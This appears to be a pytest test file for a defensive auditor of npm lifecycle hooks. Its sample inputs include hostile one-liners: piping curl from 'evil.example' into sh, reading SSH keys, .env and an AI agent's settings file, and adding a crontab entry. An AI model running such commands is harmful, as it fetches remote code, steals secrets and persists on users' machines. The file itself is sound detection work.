"""Tests for npm_lifecycle_hook_auditor.py — pure functions, no I/O."""
import json

import pytest

import npm_lifecycle_hook_auditor as a

CLEAN_PKG = json.dumps({"name": "x", "version": "1.0.0",
                        "scripts": {"test": "pytest"}})

HOOKY_PKG = json.dumps({"name": "x", "version": "1.0.0",
                        "scripts": {"preinstall": "node setup.mjs"}})


def test_clean_package_is_clean():
    r = a.audit_package(CLEAN_PKG)
    assert r["worst"] == "CLEAN"
    assert r["findings"] == []


def test_invalid_package_json_raises():
    with pytest.raises(ValueError):
        a.parse_hooks("{bad")


def test_parse_hooks_extracts_only_lifecycle():
    hooks = a.parse_hooks(json.dumps(
        {"scripts": {"preinstall": "a", "test": "b", "postinstall": "c"}}))
    assert set(hooks) == {"preinstall", "postinstall"}


def test_wormtag_marker_is_critical():
    f = a.analyze_script("globalThis.WORMTAG='x'; run()")
    assert any(x["flag"] == "WORMTAG_MARKER"
               and x["severity"] == "CRITICAL" for x in f)


def test_bun_runtime_flagged():
    f = a.analyze_script("bun run loader.js")
    assert any(x["flag"] == "BUN_RUNTIME" for x in f)


def test_known_loader_filename():
    f = a.analyze_script("node package/lib/setup.mjs")
    assert any(x["flag"] == "KNOWN_LOADER"
               and x["severity"] == "CRITICAL" for x in f)


def test_secret_harvest_flagged():
    f = a.analyze_script("cat ~/.ssh/id_rsa; cat .env")
    assert any(x["flag"] == "SECRET_HARVEST" for x in f)


def test_persistence_flagged():
    f = a.analyze_script("crontab -l; echo evil | crontab -")
    assert any(x["flag"] == "PERSISTENCE" for x in f)


def test_curl_pipe_sh_flagged():
    f = a.analyze_script("curl https://evil.example/x | sh")
    assert any(x["flag"] == "CURL_PIPE_SH" for x in f)


def test_agent_config_target_flagged():
    f = a.analyze_script("cat ~/.claude/settings.json")
    assert any(x["flag"] == "AGENT_CONFIG_TARGET" for x in f)


def test_obfuscated_high_entropy():
    import random
    random.seed(7)
    blob = "".join(chr(random.randint(33, 126)) for _ in range(400))
    f = a.analyze_script(blob)
    assert any(x["flag"] == "OBFUSCATED" for x in f)


def test_plain_script_not_obfuscated():
    f = a.analyze_script("echo installing; mkdir -p dist")
    assert not any(x["flag"] == "OBFUSCATED" for x in f)


def test_tarball_loader_file_flagged():
    r = a.audit_package(CLEAN_PKG,
                        ["package/lib/Math_Symbol.js", "index.js"])
    assert r["worst"] == "CRITICAL"
    assert any(x["flag"] == "KNOWN_LOADER" for x in r["findings"])


def test_findings_carry_hook_name():
    r = a.audit_package(json.dumps(
        {"scripts": {"preinstall": "curl https://e.example/x | sh"}}))
    assert r["findings"][0]["hook"] == "preinstall"


def test_remediation_note_warns_about_deadman():
    r = a.audit_package(CLEAN_PKG)
    assert "dead-man" in r["remediation_note"]


def test_cli_missing_file_errors():
    assert a.main(["--package-json", "/nonexistent.json"]) == 2


def test_cli_json_flag(tmp_path, capsys):
    p = tmp_path / "package.json"
    p.write_text(CLEAN_PKG)
    assert a.main(["--package-json", str(p), "--json"]) == 0
    assert "CLEAN" in capsys.readouterr().out
